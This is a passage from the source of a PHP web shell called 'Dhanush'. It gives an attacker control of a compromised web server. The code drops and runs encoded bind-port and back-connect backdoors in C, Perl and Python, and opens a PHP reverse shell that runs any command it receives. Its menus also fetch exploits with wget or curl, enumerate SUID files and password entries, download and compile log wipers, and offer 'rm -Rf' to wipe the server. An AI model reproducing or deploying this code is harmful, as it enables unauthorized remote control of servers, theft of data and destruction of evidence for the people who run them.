				@fwrite($fh,gzinflate(base64_decode($bind_port_c)));
				@fclose($fh);
				execmd("chmod  0755 /tmp/backp.c");
				execmd("gcc -o /tmp/backp /tmp/backp.c");
				$out = execmd("/tmp/backp"." ".$_POST['port']." ". $passwd ." &");
				$scan = exec_all("ps aux | grep backp".$_POST['port']); 
				if(eregi("backp".$_POST['port'],$scan))
					$bdmessage = "Process found running, backdoor setup successfully.";
				else
					$bdmessage = "Process not found running, backdoor not setup successfully.";
			}
        	} 
		if($_POST['lang'] == 'perl') 
		{
        	if(is_writable("."))
			{	
				@$fh=fopen(getcwd()."/bp.pl",'w');
				@fwrite($fh,gzinflate(base64_decode($bind_port_p)));
				@fclose($fh);
				execmd("chmod 0755 ".getcwd()."/bp.pl");
				execmd("perl ".getcwd()."/bp.pl ".$_POST['port']." ". $passwd ." &");

				$bdmessage = "<pre>$out\n".execmd("ps aux | grep bp.pl")."</pre>"; 
			} 
			else 
			{
				@$fh=fopen("/tmp/bp.pl","w");
				@fwrite($fh,gzinflate(base64_decode($bind_port_p)));
				@fclose($fh);
				execmd("chmod 0755 ".getcwd()."/bp.pl");
				execmd("perl ".getcwd()."/bp.pl ".$_POST['port']." ". $passwd ." &");
				$bdmessage = "<pre>$out\n".execmd("ps aux | grep bp.pl")."</pre>"; 
			}
        }
 	}
}
else if(isset($_POST['backconnect']))
{
    if($_POST['ip'] != "" && $_POST['port'] != "")
	{     ?><script type="text/javascript">gethome('connect');</script><?php
		$host = $_POST['ip'];
		$port = $_POST['port'];
		if($_POST["lang"] == "perl")
		{
			if(is_writable("."))
			{	
				@$fh=fopen(getcwd()."/bc.pl",'w');
				@fwrite($fh,gzuncompress(base64_decode($backconnect_perl)));
				@fclose($fh);
				$bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";
				execmd("perl ".getcwd()."/bc.pl $host $port  &",$disable);
				if(!@unlink(getcwd()."/bc.pl")) echo "<font color='#FFFFFF' size=3>Warning: Failed to delete reverse-connection program</font></br>";
			} 
			else 
			{
				@$fh=fopen("/tmp/bc.pl","w");
				@fwrite($fh,gzuncompress(base64_decode($backconnect_perl)));
				@fclose($fh);
				$bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";
				execmd("perl /tmp/bc.pl $host $port  &",$disable);
				if(!@unlink("/tmp/bc.pl")) 
					echo "<h2>Warning: Failed to delete reverse-connection program</h2></br>";
			}
		}
		else if($_POST["lang"] == "python")
		{
			if(is_writable("."))
			{
				 $w_file=@fopen(getcwd()."/bc.py","w") or die(mysql_error());
				 if($w_file)
				 {
					 @fputs($w_file,gzuncompress(base64_decode($back_connect_p)));
					 @fclose($w_file);
					 chmod(getcwd().'/bc.py', 0777);
				 }
				 execmd("python ".getcwd()."/bc.py $host $port  &",$disable);
				 $bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";

				 if(!@unlink(getcwd()."/bc.py")) 
					echo "<h2>Warning: Failed to delete reverse-connection program</h2></br>";				 				 
			} 
			else 
			{
			     $w_file=@fopen("/tmp/bc.py","w");
				 if($w_file)
				 {
					 @fputs($w_file,gzuncompress(base64_decode($back_connect_p)));
					 @fclose($w_file);
					 chmod('/tmp/bc.py', 0777);
				 }
				 execmd("python /tmp/bc.py $host $port  &",$disable);
				 $bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";
				 if(!@unlink("/tmp/bc.py")) 
					echo "<h2>Warning: Failed to delete reverse-connection program</h2><br>";				 
			}
		}
		else if($_POST["lang"] == "php")
		{
			$bdmessage = "<font color='#FFFFFF'>Trying to connect...</font>";
			$ip = $_POST['ip']; 
			$port=$_POST['port']; 
			$sockfd=fsockopen($ip , $port , $errno, $errstr ); 
			if($errno != 0)
			{
				$bdmessage = "<font color='red'><b>$errno</b> : $errstr</font>";
			}
			else if (!$sockfd)
			{ 
				   $result = "<p>Fatal : An unexpected error was occured when trying to connect!</p>";
			} 
			else
			{ 
				fputs ($sockfd ,"\n=================================================================\nCoded By Arjun\n=================================================================");
			 $pwd = exec_all("pwd");
			 $sysinfo = exec_all("uname -a");
			 $id = exec_all("id");
			 $len = 1337;
			 fputs($sockfd ,$sysinfo . "\n" );
			 fputs($sockfd ,$pwd . "\n" );
			 fputs($sockfd ,$id ."\n\n" );
			 fputs($sockfd ,$dateAndTime."\n\n" );
			 while(!feof($sockfd))
			 {  
				$cmdPrompt ="(dhanush)[$]> ";
				fputs ($sockfd , $cmdPrompt ); 
				$command= fgets($sockfd, $len);
				fputs($sockfd , "\n" . exec_all($command) . "\n\n");
			} 
			fclose($sockfd); 
			} 
		}
	}
}
else if (isset ($_GET['val1'], $_GET['val2']) && is_numeric($_GET['val1']) && is_numeric($_GET['val2'])) 
{
	$temp = "";
	for(;$_GET['val1'] <= $_GET['val2'];$_GET['val1']++) 
	{
		$uid = @posix_getpwuid($_GET['val1']);
		if ($uid)
			 $temp .= join(':',$uid)."\n";
	}
	echo '<br/>';
	paramexe('Users', $temp);
}
else if(isset($_GET['download']))
{
	download();			
}
else
{ 
	?><script type="text/javascript">gethome('home','<?php echo addslashes($dir); ?>');</script><?php
}	
$is_writable = is_writable($dir)?"<font class=txt>&lt; writable &gt;</font>":"&lt; not writable &gt;";
?>
</p><center><div id="showdir"><?php echo $bdmessage; ?></div></center>
<table style="width:100%;border-color:#333333;" border="1">
<tr>
<td align="center">
<form method="post" enctype="multipart/form-data">
Upload file : <br><input type="file" name="uploadfile" class="box" size="50">
<input type="hidden" id=path name="path" value="<?php echo $dir; ?>" />&nbsp;
<input type=submit value="Upload" name="u" value="u" class="but" ></form>
<span name="wrtble"><?php
echo $is_writable; ?></span>
		  <br>
</td>
<td align="center" style="height:105px;">Create File : 
<form onSubmit="createdir('Create',createfile.value);return false;">
<input type="text" class="box" value="<?php echo $dir . $directorysperator; ?>" name="createfile" id="createfile">
<input type="button" onClick="createdir('Create',createfile.value)" value="Create" class="but">
</form><span name="wrtble">
<?php echo $is_writable; ?></span>
</td>
</tr>
<tr>
<td align="center" style="height:105px;">Execute : <form onSubmit="executemyfile('execute','<?php echo addslashes($dir); ?>',execute.value);return false;">
<input type="text" class="box" name="execute">
<input type="hidden" id="exepath" name="exepath" value="<?php echo $dir; ?>">
 <input type="button" onClick="executemyfile('execute',exepath.value,execute.value)" value="Execute" class="but"></form></td>

<td align="center">Create Directory : <form onSubmit="createdir('createfolder',createfolder.value);return false;">
<input type="text" value="<?php echo $dir . $directorysperator; ?>" class="box" name="createfolder" id="createfolder">
<input type="button" onClick="createdir('createfolder',createfolder.value)" value="Create" class="but">
</form><span name="wrtble"><?php
echo $is_writable;
?></span></td></tr>
<tr><td style="height:105px;" align="center">Get Exploit&nbsp;<form onSubmit="getexploit(wurl.value,path.value,functiontype.value);return false;">
<input type="text" name="wurl" class="box" value="http://www.some-code/exploits.c"> 
<input type="button" onClick="getexploit(wurl.value,uppath.value,functiontype.value)" value="    G0    " class="but"><br><br>
<input type="hidden" id="uppath" name="uppath" value="<?php echo $dir . $directorysperator; ?>">
<select name="functiontype" class="sbox"> 
<option value="wwget">wget</option> 
<option value="wlynx">lynx</option> 
<option value="wfread">fread</option> 
<option value="wfetch">fetch</option> 
<option value="wlinks">links</option> 
<option value="wget">GET</option> 
<option value="wcurl">curl</option> 
</select>
</form><div id="showexp"></div>
</td>
<td align="center">
<form>
Some Commands<br>
<?php if($os != "Windows")
{ ?>
<SELECT NAME="mycmd" class="box">
     <OPTION VALUE="uname -a">Kernel version
     <OPTION VALUE="w">Logged in users
     <OPTION VALUE="lastlog">Last to connect
	 <option value='cat /etc/hosts'>IP Addresses
	 <option value='cat /proc/sys/vm/mmap_min_addr'>Check MMAP
	 <OPTION VALUE="logeraser">Log Eraser
	 <OPTION VALUE="find / -perm -2 -ls">Find all writable directories
	 <OPTION VALUE="find . -perm -2 -ls">Find all writable directories in Current Folder
	 <OPTION VALUE="find / -type f -name \"config*\"">find config* files
	 <OPTION VALUE="find . -type f -name \"config*\"">find config* files in current dir
	 <OPTION VALUE="find . -type f -perm -04000 -ls">find suid files in current dir
	 <OPTION VALUE="find / -type f -perm -04000 -ls">find all suid files
	 <OPTION VALUE="find / -user root -perm  -022">find all sgid files
	 <OPTION VALUE="find . -type f -perm -02000 -ls">find suid files in current dir
	 <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins
     <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!
     <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?
	 <?php if(is_dir('/etc/valiases')){ ?><option value="ls -l /etc/valiases">List of Cpanel`s domains(valiases)</option><?php } ?>
	 <?php if(is_dir('/etc/vdomainaliases')) { ?><option value=\"ls -l /etc/vdomainaliases">List Cpanel`s domains(vdomainaliases)</option><?php } ?>
     <OPTION VALUE="which wget curl w3m lynx">Downloaders?
     <OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO
	 <OPTION VALUE="ps aux">Show running proccess
	 <OPTION VALUE="uptime">Uptime check
	 <OPTION VALUE="cat /proc/meminfo">Memory check
     <OPTION VALUE="netstat -an | grep -i listen">Open ports
	 <OPTION VALUE="rm -Rf">Format box (DANGEROUS)
     <OPTION VALUE="wget www.ussrback.com/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed)
     <OPTION VALUE="gcc zap2.c -o zap2">WIPELOGS PT2
     <OPTION VALUE="./zap2">WIPELOGS PT3
	 <OPTION VALUE="cat /var/cpanel/accounting.log">Get cpanel logs
 </SELECT>
 <?php } else {?>
 <SELECT NAME="mycmd" class="box">
   	<OPTION VALUE="dir /s /w /b *config*.php">Find *config*.php in current directory
	<OPTION VALUE="dir /s /w /b index.php">Find index.php in current dir
 	<OPTION VALUE="systeminfo">System Informations
	<OPTION VALUE="net user">User accounts
    <OPTION VALUE="netstat -an">Open ports
	<OPTION VALUE="getmac">Get Mac Address
	<OPTION VALUE="net start">Show running services
	<OPTION VALUE="net view">Show computers
	<OPTION VALUE="arp -a">ARP Table
	<OPTION VALUE="tasklist">Show Process
	<OPTION VALUE="ipconfig/all">IP Configuration
	
 </SELECT>
 <?php } ?>
 <input type="hidden" id="auexepath" name="auexepath" value="<?php echo $dir; ?>">
<input type="button" onClick="executemyfile('mycmd',auexepath.value,mycmd.value)" value="Execute" class="but">
</form>
</td>
</tr></table><br>
	
</td>
</tr>
</table>

<?php


//logout

if(isset($_GET['logout']))
{
    setcookie("hacked",time() - 60*60);
	header("Location:$self");
	ob_end_flush();
}	
?>


<hr color="#1B1B1B">
<div align="center">
<font size="6" face="Times New Roman, Times, serif" color="#00CC00">&#2343;&#2344;&#2369;&#2359;<br>
--==Coded By Arjun==--</font><br><a href="http://www.google.com/search?q=%E0%A4%9C%E0%A4%AF%20%E0%A4%B9%E0%A4%BF%E0%A4%A8%E0%A5%8D%E0%A4%A6" target="_blank"><font color="#FF0000" size="6">&#2332;&#2351; &#2361;&#2367;&#2344;&#2381;&#2342;</font></a></div>
<?php 
}	
}

if(isset($_POST['uname']) && isset($_POST['passwd']))
{
    if( $_POST['uname'] == $user && $_POST['passwd'] == $pass )
    {
         setcookie("hacked", md5($pass));
		 $selfenter = $_SERVER["PHP_SELF"];
		 header("Location:$selfenter");
	}
}
		
if((!isset($_COOKIE['hacked']) || $_COOKIE['hacked']!=md5($pass)) )
{
		shellstyle();
?>
	<center>
	<form method="POST">
	<div style="background-color:#171717; width:50%; border-radius:7px; margin-top:150px; -moz-border-radius:25px; height:410px; background-image:url(Windows_7_-_Alien_from_outer_space.jpg);">
		<table cellpadding="9" cellspacing="4">
			<tr>
				<td align="center" colspan="2"><blink><font size="7"><b>Dhanush</b></font></blink></td>
			</tr>
			<tr>
				<td align="right"><b>User Name : </b></td>
				<td><input type="text" name="uname" style="background-color:#333333; border-radius:7px; -moz-border-radius:10px; border-color:#000000; width:170px; color:#666666;"  value="User Name" onFocus="if (this.value == 'User Name'){this.value=''; this.style.color='black';}" onBlur="if (this.value == '') {this.value='User Name'; this.style.color='#828282';}" AUTOCOMPLETE="OFF"></td>
			</tr>
			<tr>
				<td align="right"><b>Password : </b></td>
				<td><input type="password" name="passwd" style="background-color:#333333; border-radius:7px; -moz-border-radius:10px; border-color:#000000; width:170px; color:#666666;"  value="User Name" onFocus="if (this.value == 'User Name'){this.value=''; this.style.color='black';}" onBlur="if (this.value == '') {this.value='User Name'; this.style.color='#828282';}" AUTOCOMPLETE="OFF"></td>
			</tr>
			<tr>
				<td align="center" colspan="2"><input type="submit" class="but" value="     Enter     "></td>
			</tr>
			<tr>
				<td align="center" colspan="2"><font size="6" face="Times New Roman, Times, serif"><b>--==Coded By Arjun==--</b></font></td>
			</tr>
			<tr>
				<td colspan="2"><font size="4" face="Times New Roman, Times, serif"><noscript>Enable Javascript in your browser for the proper working of the shell</noscript></font></td>
			</tr>
		</table>
	</div>
	
	</form>
	</center>
<br>
</body>
</html>
<?php  
}
?>
